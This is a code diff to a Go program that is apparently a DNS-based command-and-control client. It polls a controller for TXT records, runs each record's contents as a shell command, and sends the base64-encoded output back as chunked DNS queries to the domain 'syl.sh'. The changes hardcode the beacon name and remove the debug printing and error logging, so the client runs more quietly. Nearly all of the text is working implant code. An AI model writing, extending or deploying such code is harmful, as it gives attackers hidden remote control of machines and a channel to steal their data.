@@ -2,7 +2,6 @@ package main
 
 import (
 	"encoding/base64"
-	"fmt"
 	"os/exec"
 	"strconv"
 	"strings"
@@ -18,16 +17,17 @@ const (
 	delay       = 500 * time.Millisecond
 )
 
+var baseAnswerUri = "syl.sh"
+var questionBeamUri = "137.137.137.137."
+
 func main() {
-	baseAnswerUri := "syl.sh"
 	m := new(dns.Msg)
-	m.SetQuestion("google.com.", dns.TypeTXT)
+	m.SetQuestion(questionBeamUri, dns.TypeTXT)
 
 	for {
 		r, _ := dns.Exchange(m, host)
 		if r != nil {
 			for _, a := range r.Answer {
-				// if the `Answer` is a Txt RR
 				if txt, ok := a.(*dns.TXT); ok {
 					if txt.Txt[0] == "" {
 						break
@@ -36,7 +36,6 @@ func main() {
 					cmd := strings.Split(txt.Txt[0], " ")
 					cmdToExecute := cmd[0]
 					cmdArgs := cmd[1:]
-					fmt.Println(cmd)
 
 					nm := new(dns.Msg)
 
@@ -46,7 +45,9 @@ func main() {
 					}
 					outEnc := base64.StdEncoding.EncodeToString(out)
 
-					// Add Space for META inf
+					// Add Space for META info, this is for the `cs=2&cc=1`
+					// usually this requires ~12 chars, we put it on 20 as a default
+					// for a larger messages.
 					dataLeft := (maxMsgLen - len(baseAnswerUri)) - metaInfoLen
 
 					chunks := Chunks(outEnc, dataLeft)
@@ -62,10 +63,7 @@ func main() {
 							"."
 
 						nm.SetQuestion(chunkUrl, dns.TypeTXT)
-						_, err := dns.Exchange(nm, host)
-						if err != nil {
-							fmt.Printf("%s err\n", err)
-						}
+						dns.Exchange(nm, host)
 					}
 				}
 			}
